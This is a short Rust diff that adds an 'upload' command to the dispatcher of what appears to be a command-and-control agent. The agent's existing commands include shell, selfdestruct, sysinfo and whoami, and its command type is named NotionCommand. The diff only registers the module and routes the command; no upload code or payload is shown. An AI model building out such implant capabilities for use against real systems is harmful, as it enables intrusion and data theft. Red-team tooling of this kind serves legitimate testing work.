@@ -26,6 +26,7 @@ pub mod shell;
 mod shutdown;
 mod whoami;
 mod unknown;
+mod upload;
 mod selfdestruct;
 mod sysinfo;
 
@@ -68,7 +69,8 @@ pub enum CommandType {
     Shutdown,
     Sysinfo,
     Whoami,
-    Unknown
+    Unknown,
+    Upload
 }
 
 /// Simple errors for the construction of a NotionCommand.
@@ -192,6 +194,7 @@ impl NotionCommand {
                 "shutdown"     => CommandType::Shutdown,
                 "sysinfo"      => CommandType::Sysinfo,
                 "whoami"       => CommandType::Whoami,
+                "upload"       => CommandType::Upload,
                 _              => CommandType::Unknown,
             };
             return Ok(NotionCommand { command_type: command_type, args: command_args});
@@ -223,6 +226,7 @@ impl NotionCommand {
             CommandType::Sysinfo      => sysinfo::handle().await,
             CommandType::Whoami       => whoami::handle().await,
             CommandType::Unknown      => unknown::handle().await,
+            CommandType::Upload       => upload::handle().await,
         }
     }
 }
